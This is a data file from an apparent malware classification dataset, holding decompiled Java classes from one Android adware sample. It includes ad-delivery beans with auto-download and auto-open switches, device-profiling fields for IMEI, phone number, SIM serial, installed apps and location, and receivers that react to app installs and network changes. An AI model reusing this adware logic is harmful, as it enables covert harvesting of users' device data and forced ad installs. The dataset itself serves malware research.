"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\AdInfo.code","public class AdInfo implements Serializable {   private static final long serialVersionUID=7159972039644727848L;   @Since(1.0d) @Expose private Integer adId;   @Since(1.0d) @Expose private String appName;   @Since(1.0d) @Expose private String appSize;   @Since(1.0d) @Expose private String appVersion;   private Long expires;   @Since(1.0d) @Expose private String g2Switches;   @Since(1.0d) @Expose private String g3Switches;   @Since(1.0d) @Expose private String icon;   private Long id;   @Since(1.0d) @Expose private String intro;   @Since(1.0d) @Expose private Integer kind;   @Since(1.0d) @Expose private String packageName;   @Since(1.0d) @Expose private String printscreen;   @Since(1.0d) @Expose private String recommend;   @Since(1.0d) @Expose private String showPeriod;   @Since(1.0d) @Expose private String url;   @Since(1.0d) @Expose private String wifiSwitches;   public Object clone(){     try {       return super.clone();     }  catch (    CloneNotSupportedException e) {       e.printStackTrace();       return null;     }   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   }   public String toString(){     return ""AdInfo [adId="" + this.adId + "", packageName=""+ this.packageName+ "", appName=""+ this.appName+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\AdSwitches.code","public class AdSwitches {   @SerializedName(""autoDown"") private Switch autoDown;   @SerializedName(""autoOpen"") private Switch autoOpen;   @SerializedName(""clickDown"") private Switch clickDown;   @SerializedName(""fullscreenDown"") private Switch fullscreenDown;   @SerializedName(""showStallBar"") private Switch showStallBar;   @SerializedName(""uninstallBar"") private Switch uninstallBar; public class Switch {     private boolean on;     public Switch(    int i){       this.on=i == 1;     }     public boolean isOff(){       return !this.on;     }     public boolean isOn(){       return this.on;     }     public String toString(){       return this.on ? ""1"" : ""2"";     }   }   public AdSwitches(  String str){     if (TextUtils.isEmpty(str)) {       return;     }     for (    String str2 : str.split("","")) {       String lowerCase=str2.toLowerCase();       String lowerCase2=lowerCase.split("":"")[0].toLowerCase();       int parseInt=Integer.parseInt(lowerCase.split("":"")[1]);       if (getFullscreenDown() == null) {         setFullscreenDown(new Switch(2));       }       if (lowerCase2.equalsIgnoreCase(a.ar)) {         setClickDown(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.as)) {         setAutoDown(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.at)) {         setShowStallBar(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.au)) {         setUninstallBar(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.av)) {         setAutoOpen(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.aw)) {         setFullscreenDown(new Switch(parseInt));       }     }   }   public Switch getAutoDown(){     return this.autoDown;   }   public Switch getAutoOpen(){     return this.autoOpen;   }   public Switch getClickDown(){     return this.clickDown;   }   public Switch getFullscreenDown(){     return this.fullscreenDown;   }   public Switch getShowStallBar(){     return this.showStallBar;   }   public Switch getUninstallBar(){     return this.uninstallBar;   }   public void setAutoDown(  Switch r1){     this.autoDown=r1;   }   public void setAutoOpen(  Switch r1){     this.autoOpen=r1;   }   public void setClickDown(  Switch r1){     this.clickDown=r1;   }   public void setFullscreenDown(  Switch r1){     this.fullscreenDown=r1;   }   public void setShowStallBar(  Switch r1){     this.showStallBar=r1;   }   public void setUninstallBar(  Switch r1){     this.uninstallBar=r1;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\AppWallAdInfo.code","public class AppWallAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=6701893993080397360L;   @Since(1.0d) @Expose private int hasBoundAd;   @Since(1.0d) @Expose private int isRecommend;   public int getHasBoundAd(){     return this.hasBoundAd;   }   public int getIsRecommend(){     return this.isRecommend;   }   public void setHasBoundAd(  int i){     this.hasBoundAd=i;   }   public void setIsRecommend(  int i){     this.isRecommend=i;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\BannerAdInfo.code","public class BannerAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=-7274432859905589679L;   @Since(1.0d) @Expose private String bannerImg;   private String bannerImgAll;   @Since(1.0d) @Expose private Integer showStyle;   @Since(1.0d) @Expose private Integer showTime;   public String getBannerImg(){     return this.bannerImg;   }   public String getBannerImgAll(){     return this.bannerImgAll;   }   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public void setBannerImg(  String str){     this.bannerImg=str;   }   public void setBannerImgAll(  String str){     this.bannerImgAll=str;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\CreditsWallAdInfo.code","public class CreditsWallAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=-5417526266297841259L;   @Since(1.0d) @Expose private String billingInfo;   @Since(1.0d) @Expose private Integer billingIntegral;   @Since(1.0d) @Expose private Integer billingPrice;   @Since(1.0d) @Expose private Integer billingUserMethod;   @Since(1.0d) @Expose private Integer installDelayTime;   @Since(1.0d) @Expose private Integer maximumOpenTimes;   @Since(1.0d) @Expose private Integer openDelayTime;   @Since(1.0d) @Expose private String requirement;   @Since(1.0d) @Expose private String taskIntro;   @Since(1.0d) @Expose private Integer category=0;   @Since(1.0d) @Expose private Integer installCredits=0;   @Since(1.0d) @Expose private Integer openCredits=0;   public String getBillingInfo(){     return this.billingInfo;   }   public Integer getBillingIntegral(){     return this.billingIntegral;   }   public Integer getBillingPrice(){     return this.billingPrice;   }   public Integer getBillingUserMethod(){     return this.billingUserMethod;   }   public Integer getCategory(){     return this.category;   }   public Integer getInstallCredits(){     return this.installCredits;   }   public Integer getInstallDelayTime(){     return this.installDelayTime;   }   public Integer getMaximumOpenTimes(){     return this.maximumOpenTimes;   }   public Integer getOpenCredits(){     return this.openCredits;   }   public Integer getOpenDelayTime(){     return this.openDelayTime;   }   public String getRequirement(){     return this.requirement;   }   public String getTaskIntro(){     return this.taskIntro;   }   public void setBillingInfo(  String str){     this.billingInfo=str;   }   public void setBillingIntegral(  Integer num){     this.billingIntegral=num;   }   public void setBillingPrice(  Integer num){     this.billingPrice=num;   }   public void setBillingUserMethod(  Integer num){     this.billingUserMethod=num;   }   public void setCategory(  Integer num){     this.category=num;   }   public void setInstallCredits(  Integer num){     this.installCredits=num;   }   public void setInstallDelayTime(  Integer num){     this.installDelayTime=num;   }   public void setMaximumOpenTimes(  Integer num){     this.maximumOpenTimes=num;   }   public void setOpenCredits(  Integer num){     this.openCredits=num;   }   public void setOpenDelayTime(  Integer num){     this.openDelayTime=num;   }   public void setRequirement(  String str){     this.requirement=str;   }   public void setTaskIntro(  String str){     this.taskIntro=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\CustomAdInfo.code","public class CustomAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=1;   @Since(1.0d) @Expose private String diyImg;   public String getDiyImg(){     return this.diyImg;   }   public void setDiyImg(  String str){     this.diyImg=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\FullScreenAdInfo.code","public class FullScreenAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=-7247490007764949434L;   @Since(1.0d) @Expose private String fullScreenImg;   @Since(1.0d) @Expose private Integer showTime;   public String getFullScreenImg(){     return this.fullScreenImg;   }   public Integer getShowTime(){     return this.showTime;   }   public void setFullScreenImg(  String str){     this.fullScreenImg=str;   }   public void setShowTime(  Integer num){     this.showTime=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\LocationInfo.code","public class LocationInfo {   private String latitude;   private String location;   private String longitude;   private int stateCode;   public String getLatitude(){     return this.latitude;   }   public String getLocation(){     return this.location;   }   public String getLongitude(){     return this.longitude;   }   public int getStateCode(){     return this.stateCode;   }   public void setLatitude(  String str){     this.latitude=str;   }   public void setLocation(  String str){     this.location=str;   }   public void setLongitude(  String str){     this.longitude=str;   }   public void setStateCode(  int i){     this.stateCode=i;   }   public String toString(){     return ""LocationInfo [stateCode="" + this.stateCode + "", longitude=""+ this.longitude+ "", latitude=""+ this.latitude+ "", location=""+ this.location+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\LocationParamInfo.code","public class LocationParamInfo {   private String bid;   private String cdma;   private String cellid;   private String imei;   private String inftype;   private String lac;   private String lat;   private String license;   private String lon;   private String macs;   private String mcc;   private String mmac;   private String mnc;   private String nettype;   private String nid;   private String phnum;   private String sid;   private String signal;   private String src;   public String getBid(){     return this.bid;   }   public String getCdma(){     return this.cdma;   }   public String getCellid(){     return this.cellid;   }   public String getImei(){     return this.imei;   }   public String getInftype(){     return this.inftype;   }   public String getLac(){     return this.lac;   }   public String getLat(){     return this.lat;   }   public String getLicense(){     return this.license;   }   public String getLon(){     return this.lon;   }   public String getMacs(){     return this.macs;   }   public String getMcc(){     return this.mcc;   }   public String getMmac(){     return this.mmac;   }   public String getMnc(){     return this.mnc;   }   public String getNettype(){     return this.nettype;   }   public String getNid(){     return this.nid;   }   public String getPhnum(){     return this.phnum;   }   public String getSid(){     return this.sid;   }   public String getSignal(){     return this.signal;   }   public String getSrc(){     return this.src;   }   public void setBid(  String str){     this.bid=str;   }   public void setCdma(  String str){     this.cdma=str;   }   public void setCellid(  String str){     this.cellid=str;   }   public void setImei(  String str){     this.imei=str;   }   public void setInftype(  String str){     this.inftype=str;   }   public void setLac(  String str){     this.lac=str;   }   public void setLat(  String str){     this.lat=str;   }   public void setLicense(  String str){     this.license=str;   }   public void setLon(  String str){     this.lon=str;   }   public void setMacs(  String str){     this.macs=str;   }   public void setMcc(  String str){     this.mcc=str;   }   public void setMmac(  String str){     this.mmac=str;   }   public void setMnc(  String str){     this.mnc=str;   }   public void setNettype(  String str){     this.nettype=str;   }   public void setNid(  String str){     this.nid=str;   }   public void setPhnum(  String str){     this.phnum=str;   }   public void setSid(  String str){     this.sid=str;   }   public void setSignal(  String str){     this.signal=str;   }   public void setSrc(  String str){     this.src=str;   }   public String toString(){     return ""LocationParamInfo [cdma="" + this.cdma + "", src=""+ this.src+ "", license=""+ this.license+ "", imei=""+ this.imei+ "", phnum=""+ this.phnum+ "", nettype=""+ this.nettype+ "", inftype=""+ this.inftype+ "", mcc=""+ this.mcc+ "", mnc=""+ this.mnc+ "", lac=""+ this.lac+ "", cellid=""+ this.cellid+ "", signal=""+ this.signal+ "", mmac=""+ this.mmac+ "", macs=""+ this.macs+ "", sid=""+ this.sid+ "", nid=""+ this.nid+ "", bid=""+ this.bid+ "", lon=""+ this.lon+ "", lat=""+ this.lat+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\PushAdInfo.code","public class PushAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=-7303323638900724415L;   @Since(1.0d) @Expose private int hasBoundAd;   @Since(1.0d) @Expose private Integer userCaps;   @Since(1.0d) @Expose private String userPeriod;   public int getHasBoundAd(){     return this.hasBoundAd;   }   public Integer getUserCaps(){     return this.userCaps;   }   public String getUserPeriod(){     return this.userPeriod;   }   public void setHasBoundAd(  int i){     this.hasBoundAd=i;   }   public void setUserCaps(  Integer num){     this.userCaps=num;   }   public void setUserPeriod(  String str){     this.userPeriod=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\Switch.code","public class Switch {   private boolean on;   public Switch(  int i){     this.on=i == 1;   }   public boolean isOff(){     return !this.on;   }   public boolean isOn(){     return this.on;   }   public String toString(){     return this.on ? ""1"" : ""2"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.bean\TableplaqueAdInfo.code","public class TableplaqueAdInfo extends AdInfo implements Serializable {   private static final long serialVersionUID=-4399403950689929277L;   @Since(1.0d) @Expose private Integer showStyle;   @Since(1.0d) @Expose private Integer showTime;   @Since(1.0d) @Expose private String tablePlaqueImg;   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public String getTablePlaqueImg(){     return this.tablePlaqueImg;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setTablePlaqueImg(  String str){     this.tablePlaqueImg=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\ActionNode.code","public class ActionNode {   @Since(1.0d) @SerializedName(""actions"") @Expose private List<Action> actions;   public List<Action> getActions(){     return this.actions;   }   public void setActions(  List<Action> list){     this.actions=list;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\AdNode.code","public class AdNode<T extends AdInfo> {   @Since(1.0d) @SerializedName(""adId"") @Expose private Integer adId;   @Since(1.0d) @SerializedName(""adInfo"") @Expose private T adInfo;   @Since(1.0d) @SerializedName(""adList"") @Expose private List<T> adList;   @Since(1.0d) @SerializedName(""adType"") @Expose private Integer adType;   @Since(1.0d) @SerializedName(""credits"") @Expose private Integer credits;   @Since(1.0d) @SerializedName(""delayTime"") @Expose private Integer delayTime;   @Since(1.0d) @SerializedName(""exclude"") @Expose private String exclude;   @Since(1.0d) @SerializedName(""hasPayment"") @Expose private Integer hasPayment;   @Since(1.0d) @SerializedName(""isEnd"") @Expose private Integer isEnd;   @Since(1.0d) @SerializedName(""showStyle"") @Expose private Integer showStyle;   @Since(1.0d) @SerializedName(""lastAdId"") @Expose private Integer lastAdId=a.aq;   @Since(1.0d) @SerializedName(""category"") @Expose private Integer category=0;   public Integer getAdId(){     return this.adId;   }   public T getAdInfo(){     return this.adInfo;   }   public List<T> getAdList(){     return this.adList;   }   public Integer getAdType(){     return this.adType;   }   public Integer getCategory(){     return this.category;   }   public Integer getCredits(){     return this.credits;   }   public Integer getDelayTime(){     return this.delayTime;   }   public String getExclude(){     return this.exclude;   }   public Integer getHasPayment(){     return this.hasPayment;   }   public Integer getIsEnd(){     return this.isEnd;   }   public Integer getLastAdId(){     return this.lastAdId;   }   public Integer getShowStyle(){     return this.showStyle;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdInfo(  T t){     this.adInfo=t;   }   public void setAdList(  List<T> list){     this.adList=list;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setCategory(  Integer num){     this.category=num;   }   public void setCredits(  Integer num){     this.credits=num;   }   public void setDelayTime(  Integer num){     this.delayTime=num;   }   public void setExclude(  String str){     this.exclude=str;   }   public void setHasPayment(  Integer num){     this.hasPayment=num;   }   public void setIsEnd(  Integer num){     this.isEnd=num;   }   public void setLastAdId(  Integer num){     this.lastAdId=num;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public String toString(){     return ""AdNode [adType="" + this.adType + "", adId=""+ this.adId+ "", lastAdId=""+ this.lastAdId+ "", adList=""+ this.adList+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\AppendNode.code","public class AppendNode {   @Since(1.0d) @SerializedName(""appendData"") @Expose Map<String,Object> appendData;   public Map<String,Object> getAppendData(){     return this.appendData;   }   public void setAppendData(  Map<String,Object> map){     this.appendData=map;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\DeviceNode.code","public class DeviceNode {   @Since(1.0d) @SerializedName(""appKey"") @Expose private String appKey;   @Since(1.0d) @SerializedName(""appList"") @Expose private List<Map<String,String>> appList;   @Since(1.0d) @SerializedName(""brand"") @Expose private String brand;   @Since(1.0d) @SerializedName(""devAppPackage"") @Expose private String devAppPackage;   @Since(1.0d) @SerializedName(""imei"") @Expose private String imei;   @Since(1.0d) @SerializedName(""location"") @Expose private String location;   @Since(1.0d) @SerializedName(""mobileSystem"") @Expose private String mobileSystem;   @Since(1.0d) @SerializedName(""model"") @Expose private String model;   @Since(1.0d) @SerializedName(""network"") @Expose private String network;   @Since(1.0d) @SerializedName(""operator"") @Expose private String operator;   @Since(1.0d) @SerializedName(""phoneNumber"") @Expose private String phoneNumber;   @Since(1.0d) @SerializedName(""resolution"") @Expose private String resolution;   @Since(1.0d) @SerializedName(""sdkVersion"") @Expose private String sdkVersion;   @Since(1.0d) @SerializedName(""simSerialNum"") @Expose private String simSerialNum;   @Since(1.0d) @SerializedName(""systemVersion"") @Expose private String systemVersion;   public String getAppKey(){     return this.appKey;   }   public List<Map<String,String>> getAppList(){     return this.appList;   }   public String getBrand(){     return this.brand;   }   public String getDevAppPackage(){     return this.devAppPackage;   }   public String getImei(){     return this.imei;   }   public String getLocation(){     return this.location;   }   public String getMobileSystem(){     return this.mobileSystem;   }   public String getModel(){     return this.model;   }   public String getNetwork(){     return this.network;   }   public String getOperator(){     return this.operator;   }   public String getPhoneNumber(){     return this.phoneNumber;   }   public String getResolution(){     return this.resolution;   }   public String getSdkVersion(){     return this.sdkVersion;   }   public String getSimSerialNum(){     return this.simSerialNum;   }   public String getSystemVersion(){     return this.systemVersion;   }   public void setAppKey(  String str){     this.appKey=str;   }   public void setAppList(  List<Map<String,String>> list){     this.appList=list;   }   public void setBrand(  String str){     this.brand=str;   }   public void setDevAppPackage(  String str){     this.devAppPackage=str;   }   public void setImei(  String str){     this.imei=str;   }   public void setLocation(  String str){     this.location=str;   }   public void setMobileSystem(  String str){     this.mobileSystem=str;   }   public void setModel(  String str){     this.model=str;   }   public void setNetwork(  String str){     this.network=str;   }   public void setOperator(  String str){     this.operator=str;   }   public void setPhoneNumber(  String str){     this.phoneNumber=str;   }   public void setResolution(  String str){     this.resolution=str;   }   public void setSdkVersion(  String str){     this.sdkVersion=str;   }   public void setSimSerialNum(  String str){     this.simSerialNum=str;   }   public void setSystemVersion(  String str){     this.systemVersion=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\ExecutionNode.code","public class ExecutionNode {   @Since(1.0d) @SerializedName(""deleteAdId"") @Expose private Integer deleteAdId;   @Since(1.0d) @SerializedName(""updateAd"") @Expose private Integer updateAd;   @Since(1.0d) @SerializedName(""updateDevice"") @Expose private Integer updateDevice;   public Integer getDeleteAdId(){     return this.deleteAdId;   }   public Integer getUpdateAd(){     return this.updateAd;   }   public Integer getUpdateDevice(){     return this.updateDevice;   }   public void setDeleteAdId(  Integer num){     this.deleteAdId=num;   }   public void setUpdateAd(  Integer num){     this.updateAd=num;   }   public void setUpdateDevice(  Integer num){     this.updateDevice=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\RootNode.code","public class RootNode<T extends AdInfo> {   @Since(1.0d) @SerializedName(""action"") @Expose private ActionNode action;   @Since(1.0d) @SerializedName(""ad"") @Expose private AdNode<T> ad;   @Since(1.0d) @SerializedName(""append"") @Expose private AppendNode append;   @Since(1.0d) @SerializedName(""device"") @Expose private DeviceNode device;   @Since(1.0d) @SerializedName(""execution"") @Expose private ExecutionNode execution;   @Since(1.0d) @SerializedName(""setting"") @Expose private SettingNode setting;   public ActionNode createActionNode(){     this.action=this.action == null ? new ActionNode() : this.action;     return this.action;   }   public AdNode<T> createAdNode(){     this.ad=new AdNode<>();     return this.ad;   }   public AppendNode createAppendNode(){     this.append=this.append == null ? new AppendNode() : this.append;     return this.append;   }   public DeviceNode createDeviceNode(){     this.device=this.device == null ? new DeviceNode() : this.device;     return this.device;   }   public ExecutionNode createExecutionNode(){     this.execution=this.execution == null ? new ExecutionNode() : this.execution;     return this.execution;   }   public SettingNode createSettingNode(){     this.setting=this.setting == null ? new SettingNode() : this.setting;     return this.setting;   }   public ActionNode getAction(){     return this.action;   }   public AdNode<T> getAd(){     return this.ad;   }   public AppendNode getAppend(){     return this.append;   }   public DeviceNode getDevice(){     return this.device;   }   public ExecutionNode getExecution(){     return this.execution;   }   public SettingNode getSetting(){     return this.setting;   }   public void setAction(  ActionNode actionNode){     this.action=actionNode;   }   public void setAd(  AdNode<T> adNode){     this.ad=adNode;   }   public void setAppend(  AppendNode appendNode){     this.append=appendNode;   }   public void setDevice(  DeviceNode deviceNode){     this.device=deviceNode;   }   public void setExecution(  ExecutionNode executionNode){     this.execution=executionNode;   }   public void setSetting(  SettingNode settingNode){     this.setting=settingNode;   }   public String toString(){     return ""RootNode [ad="" + this.ad + "", device=""+ this.device+ "", setting=""+ this.setting+ "", execution=""+ this.execution+ "", action=""+ this.action+ "", append=""+ this.append+ ""]"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.model.node\SettingNode.code","public class SettingNode {   @Since(1.0d) @SerializedName(""cacheExpires"") @Expose private String cacheExpires;   @Since(1.0d) @SerializedName(""cwMaxInstall"") @Expose private String cwMaxInstall;   @Since(1.0d) @SerializedName(""delayActions"") @Expose private Map<Integer,Integer> delayActions;   @Since(1.0d) @SerializedName(""firstDelayshow"") @Expose private Integer firstDelayshow;   @Since(1.0d) @SerializedName(""installInterval"") @Expose private Integer installInterval;   @Since(1.0d) @SerializedName(""pushMaximum"") @Expose private Integer pushMaximum;   @Since(1.0d) @SerializedName(""pushMinimumInterval"") @Expose private Integer pushMinimumInterval;   @Since(1.0d) @SerializedName(""pushTimePeriod"") @Expose private String pushTimePeriod;   @Since(1.0d) @SerializedName(""resourcesAddr"") @Expose private String resourcesAddr;   @Since(1.0d) @SerializedName(""serviceDate"") @Expose private String serviceDate;   @Since(2.0d) @Expose private Integer uninstallInterval;   public String getCacheExpires(){     return this.cacheExpires;   }   public String getCwMaxInstall(){     return this.cwMaxInstall;   }   public Map<Integer,Integer> getDelayActions(){     return this.delayActions;   }   public Integer getFirstDelayshow(){     return this.firstDelayshow;   }   public Integer getInstallInterval(){     return this.installInterval;   }   public Integer getPushMaximum(){     return this.pushMaximum;   }   public Integer getPushMinimumInterval(){     return this.pushMinimumInterval;   }   public String getPushTimePeriod(){     return this.pushTimePeriod;   }   public String getResourcesAddr(){     return this.resourcesAddr;   }   public String getServiceDate(){     return this.serviceDate;   }   public Integer getUninstallInterval(){     return this.uninstallInterval;   }   public void setCacheExpires(  String str){     this.cacheExpires=str;   }   public void setCwMaxInstall(  String str){     this.cwMaxInstall=str;   }   public void setDelayActions(  Map<Integer,Integer> map){     this.delayActions=map;   }   public void setFirstDelayshow(  Integer num){     this.firstDelayshow=num;   }   public void setInstallInterval(  Integer num){     this.installInterval=num;   }   public void setPushMaximum(  Integer num){     this.pushMaximum=num;   }   public void setPushMinimumInterval(  Integer num){     this.pushMinimumInterval=num;   }   public void setPushTimePeriod(  String str){     this.pushTimePeriod=str;   }   public void setResourcesAddr(  String str){     this.resourcesAddr=str;   }   public void setServiceDate(  String str){     this.serviceDate=str;   }   public void setUninstallInterval(  Integer num){     this.uninstallInterval=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.receiver\FwBReceiver.code","public class FwBReceiver extends BroadcastReceiver {   private boolean a;   @Override public void onReceive(  Context context,  Intent intent){     List<AppInfo> d;     AppInfo appInfo;     DownloadSuccessInfo downloadSuccessInfo;     String schemeSpecificPart=intent.getData().getSchemeSpecificPart();     AdInfo adInfo=new AdInfo();     adInfo.setPackageName(schemeSpecificPart);     a<?> aVar=new a<>();     aVar.c(context);     if (!intent.getAction().equals(""android.intent.action.PACKAGE_ADDED"")) {       if (!intent.getAction().equals(""android.intent.action.PACKAGE_REMOVED"") || (d=aVar.d(schemeSpecificPart)) == null || d.size() <= 0 || (appInfo=d.get(0)) == null) {         return;       }       int intValue=appInfo.getAdType().intValue();       adInfo.setAdId(appInfo.getAdId());       adInfo.setAppName(appInfo.getAppName());       adInfo.setG2Switches(appInfo.getG2Switches());       adInfo.setG3Switches(appInfo.getG3Switches());       adInfo.setWifiSwitches(appInfo.getWifiSwitches());       y<?> commonBusiness=y.getCommonBusiness(context,intValue);       if (commonBusiness != null) {         commonBusiness.onAppUnInstall(context,schemeSpecificPart,aVar,adInfo,intValue,appInfo.getInstallTime().longValue());         return;       }       return;     }     List<DownloadSuccessInfo> c=aVar.c(schemeSpecificPart);     if (c == null || c.size() == 0 || (downloadSuccessInfo=c.get(c.size() - 1)) == null) {       return;     }     int intValue2=downloadSuccessInfo.getAdType().intValue();     adInfo.setAdId(downloadSuccessInfo.getAdId());     y<?> commonBusiness2=y.getCommonBusiness(context,intValue2);     if (ab.a() - downloadSuccessInfo.getCompleteTime().longValue() < 1800000) {       this.a=true;       adInfo.setAppName(downloadSuccessInfo.getAppName());       adInfo.setG2Switches(downloadSuccessInfo.getG2Switches());       adInfo.setG3Switches(downloadSuccessInfo.getG3Switches());       adInfo.setWifiSwitches(downloadSuccessInfo.getWifiSwitches());     }     if (commonBusiness2 != null) {       commonBusiness2.onAppInstalled(context,schemeSpecificPart,this.a,adInfo,aVar,intValue2);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.receiver\FwCCReceiver.code","public class FwCCReceiver extends BroadcastReceiver {   private void a(  Context context){     a aVar=new a();     aVar.c(context);     for (    DownloadInfo downloadInfo : aVar.l()) {       if (downloadInfo.getCompleteTime().longValue() == 1) {         new Intent(context,(Class<?>)FwDservice.class);         AdInfo adInfo=new AdInfo();         adInfo.setAdId(downloadInfo.getAdId());         adInfo.setAppName(downloadInfo.getAppName());         adInfo.setG2Switches(downloadInfo.getG2Switches());         adInfo.setG3Switches(downloadInfo.getG3Switches());         adInfo.setPackageName(downloadInfo.getPackageName());         adInfo.setIcon(downloadInfo.getIcon());         adInfo.setUrl(downloadInfo.getUrl());         adInfo.setRecommend(downloadInfo.getRecommend());         adInfo.setWifiSwitches(downloadInfo.getWifiSwitches());         adInfo.setAppSize(downloadInfo.getAppSize());         m.b(context,adInfo,downloadInfo.getAdType().intValue(),downloadInfo.getDownloadType().intValue());       }     }   }   @Override public void onReceive(  Context context,  Intent intent){     if (intent == null || e.b(context) == 0) {       return;     }     a(context);     y<?> commonBusiness=y.getCommonBusiness(context,1);     if (commonBusiness != null) {       commonBusiness.reInit(context);       String a=g.a(context,com.fw.tzthree.b.a.bc);       if (a == null) {         a=commonBusiness.getDeviceInfo().getAppKey();       }       commonBusiness.onNetWorkChange(context,a);     }     y<?> commonBusiness2=y.getCommonBusiness(context,5);     if (commonBusiness2 != null) {       commonBusiness2.reInit(context);       commonBusiness2.onNetWorkChange(context,commonBusiness2.getDeviceInfo().getAppKey());     }   } } "
